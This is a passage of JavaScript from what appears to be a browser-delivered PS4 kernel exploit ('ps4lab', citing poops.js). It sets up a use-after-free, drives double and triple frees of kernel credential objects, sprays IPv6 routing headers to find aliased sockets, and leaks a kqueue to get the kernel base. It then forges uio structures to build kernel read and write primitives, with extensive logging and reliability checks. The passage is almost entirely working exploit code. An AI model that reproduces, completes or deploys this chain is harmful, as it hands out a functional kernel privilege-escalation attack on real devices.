            const pr = sc(SYS.rtprio_thread, RTP_SET, 0, prioAddr).i32;

            new Uint8Array(maskAb).fill(0);
            sc(SYS.cpuset_getaffinity, CPU_LEVEL_WHICH, CPU_WHICH_TID,
                ID, 0x10, maskAddr);
            const backMask = new int64(maskDv.getUint32(0, true),
                                       maskDv.getUint32(4, true));
            prioDv.setUint16(0, 0xffff, true);
            prioDv.setUint16(2, 0xffff, true);
            sc(SYS.rtprio_thread, RTP_LOOKUP, 0, prioAddr);
            const backPrio = [prioDv.getUint16(0, true), prioDv.getUint16(2, true)];
            const good = backMask.low === savedMask.low
                && backMask.hi === savedMask.hi
                && backPrio[0] === savedPrio[0] && backPrio[1] === savedPrio[1];
            mark("THREAD-ATTRS-RESTORED", "at=" + why + " affinity=" + ar
                + " rtprio=" + pr + " mask=" + backMask
                + " prio={" + backPrio + "} wanted=" + savedMask
                + " {" + savedPrio + "}");
            check("thread-attrs-restored-power-off-safe", good, "");

            // Workers last, reported separately. By here main is already
            // restored AND verified, so if these 16 RPCs never come back the
            // console can still be shut down normally.
            let wr = 0, wn = 0;
            for (const w of workers) {
                try {
                    if (!w.armed) continue;
                    wn++;
                    new Uint8Array(maskAb).fill(0xff);
                    await fireW(w, SYS.cpuset_setaffinity,
                        [CPU_LEVEL_WHICH, CPU_WHICH_TID, ID, 0x10, maskAddr], 5000);
                    prioDv.setUint16(0, RTP_PRIO_NORMAL, true);
                    prioDv.setUint16(2, 0, true);
                    await fireW(w, SYS.rtprio_thread, [RTP_SET, 0, prioAddr], 5000);
                    wr++;
                } catch (e) { }
            }
            mark("WORKER-ATTRS-RESTORED", "at=" + why + " n=" + wr + "/" + wn);
        }

        restoreCtx = { restore: restoreThreadAttrs };
        mark("THREAD-ATTRS-SAVED", "mask=" + savedMask
            + " rtprio={" + savedPrio + "}");
        prioDv.setUint16(0, RTP_PRIO_REALTIME, true);
        prioDv.setUint16(2, RTP, true);
        new Uint8Array(maskAb).fill(0);
        maskDv.setUint32(0, 1 << MAIN_CORE, true);

        {
            const a = sc(SYS.cpuset_setaffinity, CPU_LEVEL_WHICH, CPU_WHICH_TID,
                new int64(0xffffffff, 0xffffffff), 0x10, maskAddr).i32;
            const r = sc(SYS.rtprio_thread, RTP_SET, 0, prioAddr).i32;
            check("main-thread-pinned-realtime", a === 0 && r === 0,
                "core=" + MAIN_CORE + " rtp=" + RTP
                + " affinity=" + a + " rtprio=" + r);
        }
        function fireW(w, num, args, timeoutMs) {
            layout(w.ctx, stubAddr.get(num), args);
            return w.rpc("fire", timeoutMs === undefined ? 15000 : timeoutMs,
                w.ctx.S.low, w.ctx.S.hi);
        }
        for (const w of workers) {
            await fireW(w, SYS.cpuset_setaffinity, [CPU_LEVEL_WHICH, CPU_WHICH_TID,
                new int64(0xffffffff, 0xffffffff), 0x10, maskAddr]);
            await fireW(w, SYS.rtprio_thread, [RTP_SET, 0, prioAddr]);
        }
        mark("WORKERS-PINNED", "n=" + workers.length + " core=" + MAIN_CORE
            + " rtp=" + RTP);

        function tagFor(i) { return (RTHDR_TAG | (i & 0xffff)) >>> 0; }
        function readTag() {
            const v = leakDv.getUint32(4, true) >>> 0;
            return { ok: (v & 0xffff0000) >>> 0 === RTHDR_TAG, idx: v & 0xffff };
        }
        // Sized from the constant, not 256: an undefined slot reads as falsy and
        // would make findTwins skip every socket, i.e. silently never find a twin.
        const sprayOk = new Array(NUM_IPV6_SOCK).fill(false);
        function findTwins(timeout) {
            for (let round = 0; round < timeout; ++round) {
                for (let i = 0; i < ipv6.length; ++i) {
                    // ITEM 6(a). Re-setting a burned socket frees the chunk it
                    // aliases. sprayOk stays false so the read loop skips it too.
                    if (burned.has(ipv6[i])) { sprayOk[i] = false; continue; }
                    sprayDv.setUint32(4, tagFor(i), true);
                    // R2. A failed set (ENOBUFS) leaves this socket owning the
                    // PREVIOUS tag. Trusting it can fabricate a twin pair, and
                    // freeRthdr(twins.b) then frees a chunk another socket owns.
                    sprayOk[i] = setRthdr(ipv6[i]) === 0;
                }
                for (let i = 0; i < ipv6.length; ++i) {
                    if (R2_ON && !sprayOk[i]) continue;
                    if (getRthdr(ipv6[i], IP6_RTHDR0_SIZE, 8) < 0) continue;
                    const t = readTag();
                    if (t.ok && t.idx !== i && t.idx < ipv6.length
                        && (!R2_ON || sprayOk[t.idx]))
                        return { a: ipv6[i], b: ipv6[t.idx], round: round };
                }

                if ((round + 1) % 50 === 0) sc(SYS.sched_yield);
            }
            return null;
        }

        function findTriplet(master, slave, tag, timeout) {
            const rounds = timeout || MAX_ROUNDS_TRIPLET;
            const seen = [];
            let untagged = 0;
            for (let round = 0; round < rounds; ++round) {
                for (let i = 0; i < ipv6.length; ++i) {
                    if (ipv6[i] === master || ipv6[i] === slave) continue;
                    if (burned.has(ipv6[i])) continue;   // ITEM 6(a)
                    sprayDv.setUint32(4, tagFor(i), true);
                    setRthdr(ipv6[i]);
                }

                const t = getRthdr(master, IP6_RTHDR0_SIZE, 8) < 0
                    ? { ok: false, idx: 0 } : readTag();
                if (!t.ok) untagged++;
                const fd = (t.ok && t.idx < ipv6.length) ? ipv6[t.idx] : -1;
                if (seen.length < 6)
                    seen.push((t.ok ? t.idx + "->fd" + fd : "untagged"));
                if (fd !== -1 && fd !== master && fd !== slave
                    && !burned.has(fd)) {   // ITEM 6(a)

                    (/^(RE|UW)/.test(tag) ? trace : mark)
                        ("TRIPLET-" + tag, "round=" + round + " fd=" + fd
                         + " untagged=" + untagged);
                    return fd;
                }
                if ((round + 1) % 100 === 0) sc(SYS.sched_yield);
            }
            mark("TRIPLET-" + tag + "-MISS", "master=" + master + " slave="
                + slave + " rounds=" + rounds + " untagged=" + untagged
                + "  first reads: " + seen.join(" "));
            return 0;
        }

        let bootErr = "";
        function bootFingerprint() {
            const nameAb = new ArrayBuffer(8), outAb = new ArrayBuffer(0x10);
            keepAlive.push(nameAb, outAb);
            const nameAddr = bufAddr(nameAb), outAddr = bufAddr(outAb);
            const nameDv = new DataView(nameAb);
            new Uint8Array(outAb).fill(0);
            nameDv.setUint32(0, 1, true);
            nameDv.setUint32(4, 21, true);
            lenDv.setUint32(0, 0x10, true);
            lenDv.setUint32(4, 0, true);
            const rv = sc(SYS.sysctl, nameAddr, 2, outAddr, lenAddr, 0, 0).i32;
            const gotLen = lenDv.getUint32(0, true);
            const o = new DataView(outAb);
            const sec = o.getUint32(0, true);
            if (rv !== 0 || sec === 0) {
                bootErr = "rv=" + rv + " errno=" + errno() + " oldlen=" + gotLen;
                return null;
            }
            return sec.toString(16) + ":" + o.getUint32(8, true).toString(16);
        }
        const boot = bootFingerprint();
        mark("BOOT", boot || bootErr);
        let lastCommitted = null;
        try { lastCommitted = localStorage.getItem("ps4lab_committed_boot"); }
        catch (e) { }
        if (boot && lastCommitted === boot && params.get("force") !== "1") {
            mark("REFUSING-TO-ARM", "reason=not-rebooted-since-last-committed-run");
            check("console-rebooted-since-last-committed", false,
                "boot=" + boot + " last=" + lastCommitted + " override=?force=1");
            state("REBOOT FIRST -- this kernel is still poisoned", "bad");
            hostFail();
            return;
        }
        check("console-rebooted-since-last-committed", true,
            "boot=" + (boot || "none") + " last=" + (lastCommitted || "none"));

        let twins = null, triplets = null;

        // ITEM 6(d). `committed` means "kernel state irreversibly touched" --
        // reboot bookkeeping, not a reason to refuse a retry. Gate the loop on
        // whether an alias exists that we could NOT contain. poops.js:4356
        // refuses on that condition, not on "we already fired".
        let uncontained = null;
        for (let attempt = 1; attempt <= NUM_ATTEMPT && !triplets; ++attempt) {
            if (uncontained) {
                mark("NO-RETRY-UNCONTAINED", "attempt=" + attempt
                    + " reason=" + uncontained);
                break;
            }
            state("attempt " + attempt + "...", "warn");
            mark("ATTEMPT", attempt + "/" + NUM_ATTEMPT);

            const dummy = sc(SYS.socket, AF_UNIX, SOCK_STREAM, 0).i32;
            if (dummy === -1) { mark("ATTEMPT-SKIP", "socket failed"); continue; }
            const reg = netevent(dummy, NETEVENT_SET_QUEUE);
            if (reg.rv === -1) {
                mark("ATTEMPT-SKIP", "SET_QUEUE rv=-1 errno=" + reg.err);
                sc(SYS.close, dummy); continue;
            }

            sc(SYS.close, dummy);
            sc(SYS.setuid, 1);
            uafSock = sc(SYS.socket, AF_UNIX, SOCK_STREAM, 0).i32;
            if (uafSock !== dummy) {
                mark("ATTEMPT-SKIP", "fd not reclaimed: wanted " + dummy
                    + " got " + uafSock);
                if (uafSock !== -1) sc(SYS.close, uafSock);
                uafSock = 0;
                continue;
            }
            sc(SYS.setuid, 1);
            const clr = netevent(uafSock, NETEVENT_CLEAR_QUEUE);
            mark("UAF-ARMED", "fd=" + uafSock + " clear_rv=" + clr.rv);
            committed = true;

            try { if (boot) localStorage.setItem("ps4lab_committed_boot", boot); }
            catch (e) { }

            for (let i = 0; i < 0x80; ++i) sc(SYS.sendmsg, 0, msgAddr, 0);

            if (STOP_BEFORE_DOUBLE) {
                mark("STOP-BEFORE-DOUBLE", "withheld=dup+close");
                rebootRequired = true;
                break;
            }

            const d1 = sc(SYS.dup, uafSock).i32;
            if (d1 === -1) { mark("ATTEMPT-SKIP", "dup failed"); rebootRequired = true; continue; }
            sc(SYS.close, d1);
            rebootRequired = true;
            mark("DOUBLE-FREE", "dup=" + d1 + " closed");

            twins = findTwins(MAX_ROUNDS_TWIN);
            if (!twins) {
                // No socket showed a duplicate tag: either the double free did
                // not take, or it did and the scan missed it -- indistinguishable
                // from here (poops.js:4443 says the same). Nothing is KNOWN to be
                // aliased, so there is nothing to burn. Drop the spent fd, retry.
                if (uafSock > 0) { sc(SYS.close, uafSock); uafSock = 0; }
                mark("ATTEMPT-RETRY", "after=no-twins next="
                    + (attempt + 1) + "/" + NUM_ATTEMPT);
                continue;
            }
            mark("TWINS", "a=" + twins.a + " b=" + twins.b
                + " round=" + twins.round);

            freeRthdr(twins.b);
            let reclaimed = false, rounds = 0;

            function fireTracked(w) {
                const t = fireW(w, SYS.recvmsg, [iovSs[0], msgAddr, 0], 0);
                t.settled = false;
                t.then(() => { t.settled = true; }, () => { t.settled = true; });
                return t;
            }
            const tasks = new Array(iovWorkers.length);
            let parkedSeen = -1;
            for (let i = 0; i < NUM_IOV_SPRAY && !reclaimed; ++i) {
                rounds = i + 1;
                for (let k = 0; k < iovWorkers.length; ++k) tasks[k] = fireTracked(iovWorkers[k]);
                sc(SYS.sched_yield);
                if (parkedSeen < 0) {

                    await new Promise(r => setTimeout(r, 0));
                    parkedSeen = tasks.filter(t => !t.settled).length;
                    mark("IOV-PARKED", parkedSeen + "/" + iovWorkers.length);
                }
                if (getRthdr(twins.a, IP6_RTHDR0_SIZE, 8) >= 0
                    && leakDv.getInt32(0, true) === 1) { reclaimed = true; break; }

                for (let k = 0; k < iovWorkers.length; ++k)
                    sc(SYS.write, iovSs[1], scratch, 1);
                await Promise.all(tasks);
                for (let k = 0; k < iovWorkers.length; ++k)
                    sc(SYS.read, iovSs[0], scratch, 1);
            }
            const rets = tasks.map(function (t, k) {
                return iovWorkers[k].ctx.frameDv.getInt32(0, true);
            });
            mark("IOV-RETS", "rounds=" + rounds + " recvmsg_rv=" + rets.join(","));
            check("cr_refcnt-driven-1", reclaimed,
                "rounds=" + rounds + " parked=" + parkedSeen + "/" + iovWorkers.length);
            if (!reclaimed) {
                // ITEM 6(b). This used to `break`, which is why attempts=8 never
                // produced a second try: 7 of 89 armed runs die exactly here.
                // twins.a/twins.b DO alias the freed chunk now, so a bare retry
                // would re-spray them and free memory another socket owns. Burn
                // them, release the parked racers, drop the spent uafSock, and
                // only then go round again.
                for (let k = 0; k < iovWorkers.length; ++k)
                    sc(SYS.write, iovSs[1], scratch, 1);
                await Promise.all(tasks);
                for (let k = 0; k < iovWorkers.length; ++k)
                    sc(SYS.read, iovSs[0], scratch, 1);
                burn(twins.a, "refcount-drive");
                burn(twins.b, "refcount-drive");
                twins = null;
                if (uafSock > 0) { sc(SYS.close, uafSock); uafSock = 0; }
                mark("ATTEMPT-RETRY", "after=refcount-drive burned="
                    + burned.size + " next=" + (attempt + 1) + "/" + NUM_ATTEMPT);
                continue;
            }

            const d2 = sc(SYS.dup, uafSock).i32;
            if (d2 === -1) { mark("ATTEMPT-SKIP", "second dup failed"); break; }
            sc(SYS.close, d2);
            mark("TRIPLE-FREE", "dup=" + d2 + " closed");

            const t0 = twins.a;

            const ptOk = getRthdr(t0, IP6_RTHDR0_SIZE, 8) >= 0;
            mark("POST-TRIPLE", "master=" + t0 + " twin=" + twins.b
                + " idx=" + (ptOk ? leakDv.getInt32(4, true) : "readfail")
                + " refcnt=" + (ptOk ? leakDv.getInt32(0, true) : "readfail"));
            const t1 = findTriplet(t0, -1, "T1", MAX_ROUNDS_TRIPLET);

            for (let k = 0; k < iovWorkers.length; ++k)
                sc(SYS.write, iovSs[1], scratch, 1);
            await Promise.all(tasks);
            for (let k = 0; k < iovWorkers.length; ++k)
                sc(SYS.read, iovSs[0], scratch, 1);
            const rets2 = tasks.map(function (t, k) {
                return iovWorkers[k].ctx.frameDv.getInt32(0, true);
            });
            const irOk = getRthdr(t0, IP6_RTHDR0_SIZE, 8) >= 0;
            mark("IOV-RELEASED", "recvmsg_rv=" + rets2.join(",")
                + " master_idx=" + (irOk ? leakDv.getInt32(4, true) : "readfail"));

            const t2 = findTriplet(t0, t1, "T2", MAX_ROUNDS_TRIPLET);
            if (t1 && t2) {
                triplets = [t0, t1, t2];
                mark("TRIPLETS", triplets.join(","));
            } else {
                // A triple free happened and we could not name all three owners,
                // so we cannot burn what we cannot identify. This is the one path
                // that must NOT retry -- poops.js:4356 refuses here too.
                mark("TRIPLET-MISS", "t1=" + t1 + " t2=" + t2);
                burn(t0, "triplet-miss");
                if (t1) burn(t1, "triplet-miss");
                if (twins && twins.b) burn(twins.b, "triplet-miss");
                uncontained = "triplet-miss";
            }
        }

        check("ucred-triple-freed", !!triplets,
            triplets ? triplets.join(",") : "");

        let kernelBase = null, kqFdp = null, kqFd = -1;
        if (triplets) {
            if (off.k_kl_lock === undefined || off.k_kl_lock === 0) {
                mark("KQUEUE-SKIPPED", "reason=no-k_kl_lock");
            } else {
                state("leaking a kqueue...", "warn");

                freeRthdr(triplets[2]);
                sc(SYS.sched_yield);
                sc(SYS.sched_yield);
                let leaked = false, tries = 0, magicNoFdp = 0, shortRead = 0;
                const held = [];
                for (let i = 0; i < NUM_LEAK_KQUEUE; ++i) {
                    tries = i + 1;
                    const kq = sc(SYS.kqueue).i32;
                    if (kq === -1) {

                        mark("KQUEUE-EMFILE", "at=" + i + " held=" + held.length);
                        while (held.length) sc(SYS.close, held.pop());
                        sc(SYS.sched_yield);
                        continue;
                    }
                    held.push(kq);

                    const got = getRthdr(triplets[0], KQUEUE_SIZE, 0xa0);
                    if (got < 0xa0) shortRead++;

                    const fdpLo = leakDv.getUint32(0x98, true);
                    const fdpHi = leakDv.getUint32(0x9c, true);

                    const magicOk = got >= 0xa0
                        && leakDv.getUint32(8, true) === KQ_HDR_MAGIC
                        && leakDv.getUint32(12, true) === 0;
                    if (magicOk && (fdpLo !== 0 || fdpHi !== 0)) {
                        kqFd = held.pop();
                        leaked = true; break;
                    }

                    if (magicOk) magicNoFdp++;
                    if (held.length >= KQ_BATCH) {
                        while (held.length) sc(SYS.close, held.pop());
                        sc(SYS.sched_yield);
                    }
                    if (i && i % 500 === 0)
                        mark("KQUEUE-ROUND", "i=" + i + " magic_no_fdp="
                            + magicNoFdp + " short=" + shortRead);
                }

                while (held.length) sc(SYS.close, held.pop());
                check("kqueue-reclaimed-freed-chunk", leaked,
                    "tries=" + tries + " magic_no_fdp=" + magicNoFdp
                    + " short_reads=" + shortRead
                    + (leaked ? " fd=" + kqFd : ""));
                if (leaked) {
                    const klLock = new int64(leakDv.getUint32(0x60, true),
                                             leakDv.getUint32(0x64, true));
                    kqFdp = new int64(leakDv.getUint32(0x98, true),
                                      leakDv.getUint32(0x9c, true));
                    kernelBase = klLock.sub32(off.k_kl_lock);
                    mark("KQUEUE-LEAK", "kl_lock=" + klLock + " kq_fdp=" + kqFdp);
                    mark("KERNEL-BASE", kernelBase + " = kl_lock-0x"
                        + off.k_kl_lock.toString(16));

                    try {
                        const kbNow = "" + kernelBase;
                        const kbLast = localStorage.getItem("ps4lab_kernel_base");
                        if (kbLast === kbNow)
                            mark("SAME-BOOT-AS-LAST-RUN", "kernel_base=" + kbNow);
                        localStorage.setItem("ps4lab_kernel_base", kbNow);
                    } catch (e) { }

                    check("kl_lock-kq_fdp-kernel-pointers",
                        (klLock.hi >>> 0) === 0xffffffff
                        && (kqFdp.hi >>> 0) >= 0xffff0000,
                        "kl_lock.hi=" + hx(klLock.hi) + " kq_fdp.hi=" + hx(kqFdp.hi));
                    check("kernel-base-0x4000-aligned",
                        (kernelBase.low & 0x3fff) === 0,
                        "low=" + hx(kernelBase.low));

                    sc(SYS.close, kqFd);
                    triplets[2] = findTriplet(triplets[0], triplets[1], "KQ", MAX_ROUNDS_TRIPLET);
                    mark("POST-KQUEUE", "kq_fd=" + kqFd + " closed triplets="
                        + triplets.join(","));
                    check("triplets2-re-found-after-kqueue-leak",
                        !!triplets[2], triplets.join(","));
                }
            }
        }

        function fakeUio(uioIov, resid, rw) {
            new Uint8Array(iovAb).fill(0);
            put(iovDv, 0x00, uioIov);
            iovDv.setUint32(0x08, NUM_UIO_IOV, true);
            put(iovDv, 0x10, -1);
            put(iovDv, 0x18, resid);
            iovDv.setUint32(0x20, UIO_SYSSPACE, true);
            iovDv.setUint32(0x24, rw, true);
            put(iovDv, 0x28, 0);
        }
        function restoreRefcntIov() {
            new Uint8Array(iovAb).fill(0);
            put(iovDv, 0, 1); put(iovDv, 8, 1);
        }

        async function landUio(size, forWrite, tasks) {
            if (!tripletsUsable()) { mark("UIO-LAND-REFUSED", "triplets="
                + triplets.join(",")); return null; }

            trace("UIO-LAND", "call=" + (forWrite ? "readv" : "writev")
                + " size=" + size);
            freeRthdr(triplets[2]);
            // ITEM 5a. landFakeUio has a deadline; this one did not, so a run
            // where the chunk is never re-taken spins all NUM_UIO_SPRAY rounds
            // and only then unwinds. Bound it the same way. poops.js:4640.
            const uioDeadline = Date.now() + (params.has("uioms")
                ? parseInt(params.get("uioms"), 10) : 30000);
            for (let i = 0; i < NUM_UIO_SPRAY; ++i) {
                if ((i & 0x3f) === 0 && Date.now() > uioDeadline) {
                    mark("UIO-LAND-TIMEOUT", "rounds=" + i);
                    break;
                }
                if (i && i % 256 === 0) mark("UIO-LAND-ROUND", "i=" + i);
                for (let k = 0; k < uioWorkers.length; ++k)
                    tasks[k] = fireW(uioWorkers[k],
                        forWrite ? SYS.readv : SYS.writev,
                        [forWrite ? uioSs[0] : uioSs[1], uioIovAddr, NUM_UIO_IOV], 0);
                sc(SYS.sched_yield);

                if (getRthdr(triplets[0], IOVEC_SIZE) >= 0
                    && leakDv.getInt32(8, true) === NUM_UIO_IOV) {
                    return new int64(leakDv.getUint32(0, true),
                                     leakDv.getUint32(4, true));
                }
                if (forWrite) {
                    for (let k = 0; k < uioWorkers.length; ++k)
                        sc(SYS.write, uioSs[1], scratch, size);
                } else {
                    sc(SYS.read, uioSs[0], scratch, size);
                    for (let k = 0; k < uioWorkers.length; ++k)
                        sc(SYS.read, uioSs[0], scratch, size);
                }
                await Promise.all(tasks);
                if (!forWrite) sc(SYS.write, uioSs[1], scratch, size);
            }
            return null;
        }

        async function landFakeUio(tasks) {
            if (!tripletsUsable()) { mark("FAKEUIO-REFUSED", "triplets="
                + triplets.join(",")); return false; }
            trace("FAKEUIO-LAND", "target=" + triplets[0] + " freed=" + triplets[1]);
            freeRthdr(triplets[1]);

            const fakeDeadline = Date.now() + (params.has("fakeuioms")
                ? parseInt(params.get("fakeuioms"), 10) : 30000);
            for (let i = 0; i < NUM_IOV_SPRAY_MAX; ++i) {
                if ((i & 0x3f) === 0 && Date.now() > fakeDeadline) {
                    mark("FAKEUIO-TIMEOUT", "rounds=" + i);
                    break;
                }
                if (i && i % 500 === 0) mark("FAKEUIO-ROUND", "i=" + i);
                for (let k = 0; k < iovWorkers.length; ++k)
                    tasks[k] = fireW(iovWorkers[k], SYS.recvmsg,
                        [iovSs[0], msgAddr, 0], 0);
                sc(SYS.sched_yield);
                if (getRthdr(triplets[0], UIO_SIZE + IOVEC_SIZE) >= 0
                    && leakDv.getUint32(0x20, true) === UIO_SYSSPACE) return true;
                for (let k = 0; k < iovWorkers.length; ++k)
                    sc(SYS.write, iovSs[1], scratch, 1);
                await Promise.all(tasks);
                for (let k = 0; k < iovWorkers.length; ++k)
                    sc(SYS.read, iovSs[0], scratch, 1);
            }
            return false;
        }

        function tripletsUsable() {
            return triplets && triplets.length === 3
                && triplets.every(fd => fd > 0 && ipv6.indexOf(fd) >= 0);
        }

        async function releaseIov(itasks) {
            for (let k = 0; k < iovWorkers.length; ++k)
                sc(SYS.write, iovSs[1], scratch, 1);
            await Promise.all(itasks);
            for (let k = 0; k < iovWorkers.length; ++k)
                sc(SYS.read, iovSs[0], scratch, 1);
        }

        // ITEM 3. tripletsUsable() only checks the three fds are non-zero and
        // in the pool -- it never reads a single one back. Every getRthdr in
        // the race path targets the MASTER only, so a slave that is no longer
        // aliased is indistinguishable from one that is, and we then spend a
        // full UAF re-roll on it. 14 of 28 cut-off runs die at or after a
        // refind. poops.js:9381-9445 validates all three independently before
        // trusting them; this is that check.
        function tripletsAgree(why) {
            if (!tripletsUsable()) return false;
            const tags = [];
            for (const fd of triplets) {
                if (getRthdr(fd, UCRED_SIZE, 8) < 0) {
                    trace("TRIPLET-VALIDATE", why + " fd=" + fd + " short-read");
                    return false;
                }
                const v = leakDv.getUint32(4, true) >>> 0;
                if ((v & 0xffff0000) >>> 0 !== RTHDR_TAG) {
                    trace("TRIPLET-VALIDATE", why + " fd=" + fd + " untagged="
                        + hx(v));
                    return false;
                }
                tags.push(v);
            }
            // All three must be reading the SAME chunk, i.e. the same tag.
            const agree = tags[0] === tags[1] && tags[1] === tags[2];
            if (!agree)
                trace("TRIPLET-VALIDATE", why + " disagree "
                    + tags.map(hx).join(","));
            return agree;
        }

        function refindPair(tag) {
            for (let retry = 0; retry < 3; ++retry) {
                triplets[1] = findTriplet(triplets[0], -1, tag + "1",
                    FIND_TRIPLET_FAST);
                triplets[2] = findTriplet(triplets[0], triplets[1], tag + "2",
                    FIND_TRIPLET_FAST);
                if (tripletsUsable() && tripletsAgree(tag)) return true;
                sc(SYS.sched_yield);
            }
            mark("REFIND-UNVALIDATED", "tag=" + tag
                + " triplets=" + triplets.join(","));
            return false;
        }
        async function refindTriplets(itasks) {
            await releaseIov(itasks);
            if (refindPair("RE")) return true;
            mark("TRIPLETS-LOST", "triplets=" + triplets.join(","));
            return false;
        }

        async function unwind(utasks, itasks, why, wakeUio, size, drainReads) {
            mark("KREAD-UNWIND", "why=" + why + " wake_uio=" + (wakeUio ? 1 : 0));
            try {
                if (wakeUio && utasks && utasks[0]) {
                    // THE ONLY UNBOUNDED BLOCK IN THIS FILE, now bounded.
                    // uioSs is a blocking AF_UNIX socketpair -- no O_NONBLOCK,
                    // no SO_RCVTIMEO -- and sc() is a synchronous syscall on the
                    // main JS thread, so one read past the available bytes parks
                    // the WebProcess forever and the console has to be pulled.
                    //
                    // This is only reached when landUio EXHAUSTED its rounds,
                    // and every round ends with await Promise.all(tasks), so no
                    // racer is parked and there is nothing to wake. What is left
                    // is exactly the re-prefill: `size` bytes on the read side
                    // (landUio re-primes at its round tail) and NOTHING on the
                    // write side (forWrite skips that prime, and its racers are
                    // readv()-ers). So: one read, or none. Never N+1.
                    // The old code asked for (N+1)*8 and hung just as hard --
                    // it only ever survived because this path is rare.
                    const dsz = size || 8;
                    for (let k = 0; k < (drainReads || 0); ++k)
                        sc(SYS.read, uioSs[0], scratch, dsz);
                    await Promise.all(utasks);
                }
            } catch (e) { mark("UNWIND-UIO-THREW", e.message); }
            try {
                if (itasks && itasks[0]) await releaseIov(itasks);
            } catch (e) { mark("UNWIND-IOV-THREW", e.message); }
            restoreRefcntIov();
            const ok = refindPair("UW");
            mark("KREAD-UNWOUND", "triplets=" + triplets.join(",")
                + " usable=" + ok);
            return ok;
        }

        // `pairs` (optional) = [{addr,size},...] gathered into ONE forged uio.
        // `size` must be the sum. iovAb is 0x170 = [uio 0x30][20 iovec slots],
        // uio_iovcnt is already NUM_UIO_IOV (0x14), and fakeUio zero-fills, so
        // slots 1..19 are in-bounds and inert unless populated here.
        // ITEM 2. Refuse to spend a slow op on an address that cannot be a
        // kernel pointer. Without this, a kread that returned all zeros gave
        // int64(0,0) -- which is TRUTHY -- so the walk carried on and issued a
        // read at ~0x270 through a UIO_SYSSPACE uio inside writev: a near-NULL
        // kernel dereference. poops.js:4800-4807 gates the same way.
        const isKptr = v => !!v && (v.hi >>> 0) >= 0xffff0000;
        const kAligned = v => !!v && ((v.low >>> 0) & 7) === 0;
        function kaddrOk(v) { return isKptr(v) && kAligned(v); }

        async function kreadSlow(addr, size, pairs) {
            if (kreadPoisoned) { mark("KREAD-REFUSED", "reason=poisoned"); return null; }
            if (pairs) {
                for (const q of pairs) if (!kaddrOk(q.addr)) {
                    mark("KREAD-REFUSED", "bad-pair-addr=" + q.addr);
                    return null;
                }
            } else if (!kaddrOk(addr)) {
                mark("KREAD-REFUSED", "bad-addr=" + addr);
                return null;
            }
            if (!tripletsUsable()) { mark("KREAD-REFUSED", "triplets="
                + triplets.join(",")); return null; }
            if (pairs && pairs.length > NUM_UIO_IOV) {
                mark("KREAD-REFUSED", "pairs=" + pairs.length + " > " + NUM_UIO_IOV);
                return null;
            }
            mark("KREAD-BEGIN", "addr=" + (pairs
                ? pairs.map(p2 => "" + p2.addr).join("+") : addr) + " size=" + size);
            const bufs = uioWorkers.map(function () {
                const ab = new ArrayBuffer(size); keepAlive.push(ab);
                // ITEM 2. Sentinel-fill so an EMPTY read is distinguishable
                // from a real read of a zero qword. A fresh buffer is all
                // zeros, which used to sail through the hit test below and
                // return int64(0,0) as if it were kernel data.
                new Uint8Array(ab).fill(0x41);
                return { ab: ab, addr: bufAddr(ab), dv: new DataView(ab) };
            });
            lenDv.setUint32(0, size, true);
            sc(SYS.setsockopt, uioSs[1], SOL_SOCKET, SO_SNDBUF, lenAddr, 4);
            sc(SYS.write, uioSs[1], scratch, size);
            put(uioIovDv, 8, size);
            const utasks = new Array(uioWorkers.length);
            const uioIov = await landUio(size, false, utasks);
            if (!uioIov) { await unwind(utasks, null, "no-uio", true, size, 1); return null; }
            trace("UIO-LANDED", "uio_iov=" + uioIov);
            fakeUio(uioIov, size, UIO_WRITE);
            if (pairs) {
                for (let i = 0; i < pairs.length; ++i) {
                    put(iovDv, 0x30 + IOVEC_SIZE * i, pairs[i].addr);
                    put(iovDv, 0x38 + IOVEC_SIZE * i, pairs[i].size);
                }
            } else {
                put(iovDv, 0x30, addr);
                put(iovDv, 0x38, size);
            }
            const itasks = new Array(iovWorkers.length);
            const ok = await landFakeUio(itasks);
            if (!ok) { kreadPoisoned = true;
                await unwind(utasks, itasks, "no-fake-uio", false, size);
                return null; }
            trace("KREAD-WAKE", "src=" + addr);

            sc(SYS.read, uioSs[0], scratch, size);
            let got = null, drained = 0;
            for (const b of bufs) {
                sc(SYS.read, uioSs[0], b.addr, size);
                drained++;
                if (!got
                    && !(b.dv.getUint32(0, true) === 0x41414141
                         && b.dv.getUint32(4, true) === 0x41414141)) got = b.dv;
            }
            trace("KREAD-DRAINED", "bufs=" + drained + "/" + bufs.length
                + " hit=" + (got ? 1 : 0));
            await Promise.all(utasks);
            trace("KREAD-UIO-JOINED", "");
            restoreRefcntIov();
            await refindTriplets(itasks);
            return got;
        }

        async function kwriteSlow(dst, srcAddr, size) {
            if (kreadPoisoned) { mark("KWRITE-REFUSED", "reason=poisoned"); return false; }
            if (!kaddrOk(dst)) { mark("KWRITE-REFUSED", "bad-dst=" + dst); return false; }
            if (!tripletsUsable()) { mark("KWRITE-REFUSED", "triplets="
                + triplets.join(",")); return false; }
            mark("KWRITE-BEGIN", "dst=" + dst + " size=" + size);
            lenDv.setUint32(0, size, true);
            sc(SYS.setsockopt, uioSs[1], SOL_SOCKET, SO_SNDBUF, lenAddr, 4);
            put(uioIovDv, 8, size);
            const utasks = new Array(uioWorkers.length);
            const uioIov = await landUio(size, true, utasks);
            if (!uioIov) { await unwind(utasks, null, "no-uio", true, size, 0); return false; }
            fakeUio(uioIov, size, UIO_READ);
            put(iovDv, 0x30, dst);
            put(iovDv, 0x38, size);
            const itasks = new Array(iovWorkers.length);
            const ok = await landFakeUio(itasks);
            if (!ok) { kreadPoisoned = true;
                await unwind(utasks, itasks, "no-fake-uio", false, size);
                return false; }
            for (let k = 0; k < uioWorkers.length; ++k)
                sc(SYS.write, uioSs[1], srcAddr, size);
            await Promise.all(utasks);
            restoreRefcntIov();
            await refindTriplets(itasks);
            return true;
        }

        // R1. This read proves nothing the pipe primitive does not prove better,
        // and it is slow op #1 of 7 -- one full UAF re-roll at ~3.1% death for a
        // check that is repeated at :kernelview-reads-kernel-elf-header on the
        // FAST primitive, before the first kernel write. poops.js:8672 runs its
        // ELF proof on kread64Fast for exactly this reason, and poops.js:6063
        // records deleting the equivalent slow read. `kernelBase` is still
        // required below, so the gate on it stays.
        const R1_ON = params.get("r1") !== "0";
        if (!R1_ON && kernelBase && triplets) {
            state("kread_slow...", "warn");
            const got = await kreadSlow(kernelBase, 0x20);
            if (got) {
                const b = [];
                for (let i = 0; i < 16; ++i) b.push(got.getUint8(i));
                mark("KREAD", "kernel_base -> "
                    + b.map(v => v.toString(16).padStart(2, "0")).join(" "));
                check("kread_slow-reads-kernel-elf-header",
                    got.getUint32(0, true) === 0x464c457f,
                    "e_type=" + got.getUint16(0x10, true)
